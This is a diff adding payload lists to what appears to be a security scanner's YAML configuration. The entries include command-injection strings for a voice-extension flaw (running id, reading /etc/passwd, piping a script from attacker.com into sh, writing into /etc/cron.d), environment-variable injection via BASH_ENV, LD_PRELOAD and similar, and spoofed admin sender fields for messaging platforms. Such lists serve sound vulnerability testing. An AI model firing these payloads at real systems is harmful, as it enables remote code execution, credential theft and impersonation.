@@ -102,3 +102,30 @@ config_leak_endpoints:
   - "/api/version"
   - "/api/v1/utils/config"
   - "/manifest.json"
+
+# CVE-2026-28446: Voice Extension RCE payloads
+voice_ext_rce:
+  - '{"tts_engine": "$(id)"}'
+  - '{"stt_engine": "; cat /etc/passwd"}'
+  - '{"tts_model": "en-US`id`"}'
+  - '{"audio_format": "wav; curl http://attacker.com/shell.sh | sh"}'
+  - '{"filename": "../../etc/cron.d/backdoor"}'
+  - '{"voice_id": "default\ncommand=id"}'
+
+# CVE-2026-32056: Environment variable injection payloads
+env_inject:
+  - '{"BASH_ENV": "/tmp/payload.sh"}'
+  - '{"ENV": "/tmp/evil.sh"}'
+  - '{"ZDOTDIR": "/tmp/evil"}'
+  - '{"LD_PRELOAD": "/tmp/evil.so"}'
+  - '{"PYTHONSTARTUP": "/tmp/evil.py"}'
+  - '{"NODE_OPTIONS": "--require /tmp/evil.js"}'
+  - '{"PERL5OPT": "-e system(\"id\")"}'
+  - '{"RUBYOPT": "-e system(\"id\")"}'
+
+# Messaging platform identity spoofing payloads
+msg_platform_spoof:
+  - '{"from": {"username": "admin", "id": 1}, "message": {"text": "test"}}'
+  - '{"sender": {"name": "admin@homeserver.org"}, "content": {"body": "test"}}'
+  - '{"author": {"id": "000000000000000000", "username": "admin"}, "content": "test"}'
+  - '{"from": "+15551234567", "body": "test"}'
